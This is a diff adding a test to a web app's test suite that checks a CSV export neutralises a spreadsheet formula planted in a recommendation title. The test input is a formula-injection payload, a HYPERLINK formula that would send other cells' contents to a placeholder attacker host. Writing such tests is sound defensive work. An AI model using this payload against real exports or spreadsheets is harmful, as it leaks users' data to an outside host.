@@ -471,6 +471,19 @@ describe('the Recommended list', () => {
     expect(page).not.toContain('recommendation-'); // it left the list
   });
 
+  it('a wanted recommendation’s title — the one text no form of ours checked — leaves the export guarded, never as a formula (§16 #91)', async () => {
+    const formula = '=HYPERLINK("https://evil.example/?"&D2&E2,"Open")';
+    const id = await received({ title: formula, creators: '@Priya' });
+    const asha = await member('asha');
+    peerSide(peer);
+    expect((await a.postForm(`/recommendations/${id}/want`, { libraryId: String(shelfId) }, asha.cookie)).status).toBe(302);
+    const csv = await (await a.get('/export.csv?after=0', asha.cookie)).text();
+    const line = csv.split('\r\n').find((l) => l.includes('evil.example'))!;
+    expect(line).toContain(`"'=HYPERLINK(""https://evil.example/?""&D2&E2,""Open"")"`);
+    expect(line).toContain(",'@Priya,");
+    expect(line).not.toMatch(/(^|,)"?=HYPERLINK/);
+  });
+
   it('puts the want on a copy already here — a game by its BGG id, a record by its Discogs id — and makes no second', async () => {
     const game = await createItem(env.DB, { libraryId: shelfId, mediaType: 'boardgame', title: 'Azul (ours)', details: JSON.stringify({ bgg_id: '230802' }) });
     const record = await createItem(env.DB, { libraryId: shelfId, mediaType: 'vinyl', title: 'Kind of Blue (ours)', details: JSON.stringify({ discogs_id: 1234567 }), copies: 1 });
